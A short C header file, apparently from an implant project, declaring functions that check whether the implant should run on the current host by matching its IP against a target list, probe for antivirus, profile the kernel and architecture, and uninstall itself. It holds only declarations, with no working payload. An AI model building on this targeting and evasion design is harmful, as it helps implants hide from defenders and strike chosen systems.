#ifndef VALIDATORS_H
#define VALIDATORS_H

#define IPV4_LOOPBACK_ADDR "127.0.0.1"
#define IPV6_LOOPBACK_ADDR "::1"
#define CORRECT_IP_LIST {"192.168.1.234", "192.168.1.0/24"} // not real ip
#define IPV6_ADDR_LEN 16
#define MAX_INTERFACE_LEN 16
#define MAX_IP_LENGTH 45

typedef enum {
    CORRECT_HOST = 0,
    ERR_NO_IP_MATCH = 1,
    ERR_IFADDR_FAILED = 2,
    ERR_NAMEINFO_FAILED = 3,
    ERR_NO_HOST_SPECS_MATCH = 4,
} host_check_status_t;

typedef struct host_profile {
    char host_ip[MAX_IP_LENGTH];
    int family;
    char interface_name[MAX_INTERFACE_LEN];
} host_profile;

typedef struct Profile {
    char *kernel;
    char *kernel_release;
    char *kernel_version;
    char *arch;
} Profile;

void uninstall();

/**
 * @brief Determines if implant should be ran on current host.
 * 
 * @param host_info Pointer to a struct to be filled out with useful information about the host.
 * @retval CORRECT_HOST -              Host is valid
 * @retval ERR_NO_IP_MATCH -           Host IP was not found in IP list
 * @retval ERR_IFADDR_FAILED -         Error retrieving interface addresses
 * @retval ERR_NAMEINFO_FAILED -       Error converting address to string
 */
host_check_status_t check_if_host_is_correct(host_profile *host_info);

void check_for_antivirus();

/**
 * @brief Returns associated string for host check status
 * 
 * @param status Status code returned by check_if_host_is_correct
 * 
 */
const char *get_validator_status_message(host_check_status_t status);

Profile *get_profile();

void free_profile(Profile **pProfile);

#endif